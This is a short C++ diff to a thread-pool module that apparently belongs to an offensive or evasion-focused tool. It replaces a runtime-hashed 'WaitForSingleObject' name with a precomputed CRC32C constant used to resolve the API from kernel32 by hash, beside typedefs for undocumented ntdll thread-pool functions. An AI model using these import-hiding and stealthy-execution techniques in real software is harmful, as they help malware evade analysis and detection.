@@ -13,6 +13,9 @@
 
 namespace ThreadPool
 {
+    // Pre-computed CRC32C hash constants
+    static constexpr DWORD HASH_WaitForSingleObject = 0x6D073E2B;
+
     // Typedefs for undocumented ntdll Thread Pool functions
     typedef NTSTATUS(NTAPI* pTpAllocWork)(void** work, void* callback, void* context, void* env);
     typedef void(NTAPI* pTpPostWork)(void* work);
@@ -72,7 +75,7 @@ namespace ThreadPool
             HMODULE hK32w = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
             if (hK32w) {
                 auto pWFSO = (DWORD(WINAPI*)(HANDLE,DWORD))
-                    Api::GetProcByHashCrc(hK32w, Crc32C::ConstHash("WaitForSingleObject"));
+                    Api::GetProcByHashCrc(hK32w, HASH_WaitForSingleObject);
                 if (pWFSO) pWFSO((HANDLE)(LONG_PTR)-2, 5000); // GetCurrentThread() = (HANDLE)-2
             }
 
